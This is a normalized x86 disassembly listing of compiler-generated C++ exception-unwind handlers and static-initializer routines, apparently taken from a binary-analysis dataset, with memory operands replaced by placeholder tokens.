sub_44bd5c
lea eax [ ebp + 0x1c ]
jmp sub_40ab00
sub_44bd64
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bd6c
lea eax [ ebp + 0xc ]
jmp sub_40bee0
sub_44bd74
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bd7c
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44bd84
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44bd8e
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44bd96
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bd9e
lea eax [ ebp + 0xc ]
jmp sub_40bee0
sub_44bda6
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bdae
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44bdb6
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bdbe
lea eax [ ebp + 0xc ]
jmp sub_40bee0
sub_44bdc6
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bdce
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bdf0
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bdf8
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_44be02
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44be0a
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44be12
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44be1a
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44be22
lea eax [ ebp - 0x20 ]
push eax
call sub_40a500
retn
sub_44be2c
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44be34
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44be3c
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44be44
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44be60
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44be68
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44be70
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44be78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bea0
mov ecx rw-data
jmp sub_40f250
sub_44beaa
push rw-data
call sub_40f2a0
retn
sub_44beb5
push rw-data
call sub_40f100
retn
sub_44bec0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bee0
push rw-data
call sub_40f100
retn
sub_44beeb
push rw-data
call sub_40f2a0
retn
sub_44bef6
mov ecx rw-data
jmp sub_40f250
sub_44bf00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bf20
push sub_44c400
call sub_44418f
pop ecx
retn
sub_44c370
call sub_427b30
push sub_44c4a0
call sub_44418f
pop ecx
retn
sub_44c381
call [ GetProcessHeap@IAT ]
push sub_44c4ab
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] 0x0
call sub_44418f
pop ecx
retn
sub_44c3a9
push sub_44c4b5
call sub_44418f
pop ecx
retn
sub_44c3b5
mov ecx rw-data
call sub_443c72
push sub_44c4c0
call sub_44418f
pop ecx
retn
sub_44c3cb
mov ecx rw-data
call sub_443d0f
push sub_44c4ca
call sub_44418f
pop ecx
retn
sub_44c3e1
mov ecx rw-data
call sub_443e32
push sub_44c4d4
call sub_44418f
pop ecx
retn
sub_44c400
retn
sub_44c4a0
mov [ rw-data ] r--data
retn
sub_44c4ab
mov ecx rw-data
jmp sub_4439f1
sub_44c4b5
mov [ rw-data ] r--data
retn
sub_44c4c0
mov ecx rw-data
jmp sub_443bfd
sub_44c4ca
mov ecx rw-data
jmp sub_443cb2
sub_44c4d4
push [ rw-data ]
push rw-data
call sub_443dbc
mov ecx rw-data
jmp sub_443d78
